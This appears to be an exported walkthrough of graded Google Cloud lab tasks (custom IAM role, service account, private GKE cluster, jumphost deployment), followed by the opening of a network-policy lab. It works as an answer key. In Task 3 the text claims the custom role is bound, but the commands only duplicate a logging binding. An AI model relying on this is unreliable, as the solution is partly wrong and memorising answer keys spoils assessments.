for the cluster includes the internal ip-address for the instance, and you must specify the </span><code>--internal-ip</code><span> flag when retrieving cluster credentials using the </span><code>gcloud container clusters get-credentials</code><span> command.</span></p><p><span>All new cloud objects and services that you create should include the &quot;orca-&quot; prefix.</span></p><p><span>Your final task is to validate that the cluster is working correctly by deploying a simple application to the cluster to test that management access to the cluster using the </span><code>kubectl</code><span> tool is working from the </span><code>orca-jumphost</code><span> compute instance.</span></p><p><span>For all tasks in this lab, use the </span><code>europe-west4</code><span> region and the </span><code>europe-west4-b</code><span> zone.</span></p><h3 id='task-1-create-a-custom-security-role'><span>Task 1. Create a custom security role</span></h3><p><span>Your first task is to create a new custom IAM security role called </span><code>orca_storage_editor_401</code><span> that will provide the Google Cloud storage bucket and object permissions required to be able to create and update storage objects.</span></p><h4 id='solution'><span>Solution</span></h4><p><strong><span>Create a Role Definition File</span></strong><span>:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat &gt; role-definition.yaml &lt;&lt;EOF_END</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">title: "$CUSTOM_SECURIY_ROLE"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">description: "Permissions"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">stage: "ALPHA"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">includedPermissions:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- storage.buckets.get</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- storage.objects.get</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- storage.objects.list</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- storage.objects.update</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- storage.objects.create</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EOF_END</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 248px;"></div><div class="CodeMirror-gutters" style="display: none; height: 248px;"></div></div></div></pre><p><span>Here, we create a YAML file that defines the custom IAM role. This file specifies the title, description, stage, and included permissions for the role.</span></p><p><strong><span>Create the Custom Security Role</span></strong><span>:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam roles create $CUSTOM_SECURIY_ROLE --project $DEVSHELL_PROJECT_ID --file role-definition.yaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Assessment Completed!</span></p><p><span>Check that a Custom security role has been created.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p><em><span>Assessment Completed!</span></em></p><p>&nbsp;</p><p>&nbsp;</p><h3 id='task-2-create-a-service-account'><span>Task 2. Create a service account</span></h3><p><span>Your second task is to create the dedicated service account that will be used as the service account for your new private cluster. You must name this account </span><code>orca-private-cluster-523-sa</code><span>.</span></p><h4 id='solution-2'><span>Solution</span></h4><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud iam service-accounts create orca-private-cluster-523-sa --display-name "Orca Private Cluster Service Account"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Check that a new service account has been created.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-3-bind-a-custom-security-role-to-a-service-account'><span>Task 3. Bind a custom security role to a service account</span></h3><p><span>You must now bind the Cloud Operations logging and monitoring roles that are required for Kubernetes Engine Cluster service accounts as well as the custom IAM role you created for storage permissions to the Service Account you created earlier.</span></p><h4 id='solution-3'><span>Solution </span></h4><p><strong><span>Bind IAM Policy Roles:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud projects add-iam-policy-binding qwiklabs-gcp-02-7589d0814713 --member serviceAccount:orca-private-cluster-523-sa@qwiklabs-gcp-02-7589d0814713.iam.gserviceaccount.com --role roles/monitoring.viewer</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud projects add-iam-policy-binding qwiklabs-gcp-02-7589d0814713 --member serviceAccount:orca-private-cluster-523-sa@qwiklabs-gcp-02-7589d0814713.iam.gserviceaccount.com --role roles/monitoring.metricWriter</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud projects add-iam-policy-binding qwiklabs-gcp-02-7589d0814713 --member serviceAccount:orca-private-cluster-523-sa@qwiklabs-gcp-02-7589d0814713.iam.gserviceaccount.com --role roles/logging.logWriter</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud projects add-iam-policy-binding qwiklabs-gcp-02-7589d0814713 --member serviceAccount:orca-private-cluster-523-sa@qwiklabs-gcp-02-7589d0814713.iam.gserviceaccount.com --role roles/logging.logWriter</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 248px;"></div><div class="CodeMirror-gutters" style="display: none; height: 248px;"></div></div></div></pre><p><span>These commands bind various IAM roles to the service account. The roles </span><code>monitoring.viewer</code><span>, </span><code>monitoring.metricWriter</code><span>, and </span><code>logging.logWriter</code><span> provide monitoring and logging capabilities. The custom role created in Task 1 is also bound to the service account.</span></p><p><span>Check that a the correct built in and custom security roles have been bound to the new service account.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-4-create-and-configure-a-new-kubernetes-engine-private-cluster'><span>Task 4. Create and configure a new Kubernetes Engine private cluster</span></h3><p><span>You must now use the service account you have configured when creating a new Kubernetes Engine private cluster. The new cluster configuration must include the following:</span></p><ul><li><p><span>The cluster must be called </span><code>orca-cluster-455</code></p></li><li><p><span>The cluster must be deployed to the subnet </span><code>orca-build-subnet</code></p></li><li><p><span>The cluster must be configured to use the </span><code>orca-private-cluster-523-sa</code><span> service account.</span></p></li><li><p><span>The private cluster options </span><code>enable-master-authorized-networks</code><span>, </span><code>enable-ip-alias</code><span>, </span><code>enable-private-nodes</code><span>, and </span><code>enable-private-endpoint</code><span> must be enabled.</span></p></li></ul><p><span>Once the cluster is configured you must add the internal ip-address of the </span><code>orca-jumphost</code><span> compute instance to the master authorized network list.</span></p><p><strong><span>Create the GKE Cluster</span></strong><span>:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud container clusters create $CLUSTER_NAME --num-nodes 1 --master-ipv4-cidr=172.16.0.64/28 --network orca-build-vpc --subnetwork orca-build-subnet --enable-master-authorized-networks --master-authorized-networks 192.168.10.2/32 --enable-ip-alias --enable-private-nodes --enable-private-endpoint --service-account $SERVICE_ACCOUNT@$DEVSHELL_PROJECT_ID.iam.gserviceaccount.com --zone $ZONE</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>This command creates a private Google Kubernetes Engine (GKE) cluster. Key configurations include enabling private nodes and endpoints, setting master authorized networks, and specifying the service account for the cluster.</span></p><p><span>Confirm that a Kubernetes Engine private cluster has been deployed correctly.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-5-deploy-an-application-to-a-private-kubernetes-engine-cluster'><span>Task 5. Deploy an application to a private Kubernetes Engine cluster</span></h3><p><span>You have a simple test application that can be deployed to any cluster to quickly test that basic container deployment functionality is working and that basic services can be created and accessed. You must configure the environment so that you can deploy this simple demo to the new cluster using the jumphost </span><code>orca-jumphost</code><span>.</span></p><p><strong><span>Note:</span></strong><span> Make sure to properly install the </span><code>gke-gcloud-auth-plugin</code><span> before running any </span><code>kubectl</code><span> commands. This is detailed below in </span><strong><span>Tip 1</span></strong><span>.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl create deployment hello-server --image=gcr.io/google-samples/hello-app:1.0</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>This deploys an application that listens on port 8080 that can be exposed using a basic load balancer service for testing.</span></p><h4 id='solution-4'><span>Solution</span></h4><p><strong><span>Connect to the orca-jumphost VM</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh --zone "$ZONE" "orca-jumphost" --project qwiklabs-gcp-02-7589d0814713 </span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><strong><span>Run this command to orca-jumphost VM</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config set compute/zone europe-west4-b </span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud container clusters get-credentials orca-cluster-455 --project qwiklabs-gcp-02-7589d0814713 --internal-ip --location europe-west4</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get install google-cloud-sdk-gke-gcloud-auth-plugin</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl create deployment hello-server --image=gcr.io/google-samples/hello-app:1.0</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 180px;"></div><div class="CodeMirror-gutters" style="display: none; height: 180px;"></div></div></div></pre><p>&nbsp;</p><p><span>Check that an application has been deployed to a private Kubernetes Engine cluster.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='congratulations-26'><span>Congratulations!</span></h3><p><span>In this lab, you have configured a new Kubernetes Engine private cluster that is configured to use a dedicated service account with the least privileges required to run the cluster. You have also created a custom IAM role that provides the permissions required to create and update storage objects in Google Cloud Storage buckets and bound that role to the service account used by the cluster. You also validated that the cluster is working correctly by deploying a simple application to the cluster to test that management access to the cluster using the </span><code>kubectl</code><span> tool is working from the </span><code>orca-jumphost</code><span> compute instance.</span></p><p><img src="images/LJBXHCk%2FXoRpaS5OxvXGPf3kIqERA7gTiNnmrpa2wzQ%3D.png" referrerpolicy="no-referrer" alt="Implement Cloud Security Fundamentals on Google Cloud badge"></p><p>&nbsp;</p><p>&nbsp;</p><h1 id='google-kubernetes-engine-best-practices-security'><span>Google Kubernetes Engine Best Practices: Security</span></h1><p>&nbsp;</p><h2 id='lab---how-to-use-a-network-policy-on-google-kubernetes-engine'><span>LAB - How to Use a Network Policy on Google Kubernetes Engine</span></h2><h3 id='overview-30'><span>Overview</span></h3><p><span>This lab will show you how to improve the security of your Kubernetes Engine by applying fine-grained restrictions to network communication.</span></p><p><span>The </span><a href='https://en.wikipedia.org/wiki/Principle_of_least_privilege'><span>Principle of Least Privilege</span></a><span> is widely recognized as an important design consideration in enhancing the protection of critical systems from faults and malicious behavior. It suggests that every component must be able to access </span><strong><span>only</span></strong><span> the information and resources that are necessary for its legitimate purpose. This document demonstrates how the Principle of Least Privilege can be implemented within the Kubernetes Engine network layer.</span></p><p><span>Network connections can be restricted at two tiers of your Kubernetes Engine infrastructure. The first, and coarser grained, mechanism is the application of Firewall Rules at the Network, Subnetwork, and Host levels. These rules are applied outside of the Kubernetes Engine at the VPC level.</span></p><p><span>While Firewall Rules are a powerful security measure, and Kubernetes enables you to define even finer grained rules via Network Policies. </span><a href='https://kubernetes.io/docs/concepts/services-networking/network-policies/'><span>Network Policies</span></a><span> are used to limit intra-cluster communication. Network policies do not apply to pods attached to the host&#39;s network namespace.</span></p><p><span>For this lab you will provision a private Kubernetes Engine cluster and a bastion host with which to access it. A bastion host provides a single host that has access to the cluster, which, when combined with a private Kubernetes network, ensures that the cluster isn&#39;t exposed to malicious behavior from the internet at large. Bastions are particularly useful when you do not have VPN access to the cloud network.</span></p><p><span>Within the cluster, a simple HTTP server and two client pods will be provisioned. You will learn how to use a Network Policy and labeling to only allow connections from one of the client pods.</span></p><p><span>This lab was created by GKE Helmsman engineers to give you a better understanding of GKE Binary Authorization. You can view this demo by running </span><code>gsutil cp -r gs://spls/gke-binary-auth/* .</code><span> and </span><code>cd gke-binary-auth-demo</code><span> command in cloud shell. We encourage any and all to contribute to our assets!</span></p><h3 id='architecture-3'><span>Architecture</span></h3><p><span>You will define a private, standard mode Kubernetes cluster that uses Dataplane V2. Dataplane V2 has network policies enabled by default.</span></p><p><span>Since the cluster is private, neither the API nor the worker nodes will be accessible from the internet. Instead, you will define a bastion host and use a firewall rule to enable access to it. The bastion&#39;s IP address is defined as an authorized network for the cluster, which grants it access to the API.</span></p><p><span>Within the cluster, provision three workloads:</span></p><ol start='' ><li><p><span>hello-server: this is a simple HTTP server with an internally-accessible endpoint</span></p></li><li><p><span>hello-client-allowed: this is a single pod that repeatedly attempts to access hello-server. The pod is labeled such that the Network Policy will allow it to connect to hello-server.</span></p></li><li><p><span>hello-client-blocked: this runs the same code as hello-client-allowed but the pod is labeled such that the Network Policy will </span><strong><span>not</span></strong><span> allow it to connect to hello-server.</span></p></li></ol><p><img src="images\hk%2FxJLR97fdUVv6wUeXrNnsWxUr7OaAbdS8uCBFOUX4%3D" referrerpolicy="no-referrer" alt="Kubernetes cluster diagram"></p><h3 id='setup-and-requirements-27'><span>Setup and requirements</span></h3><h3 id='before-you-click-the-start-lab-button-13'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h4 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-8'><span>How to start your lab and sign in to the Google Cloud console</span></h4><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-02-1aeeb3e9ea9b@qwiklabs.net</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 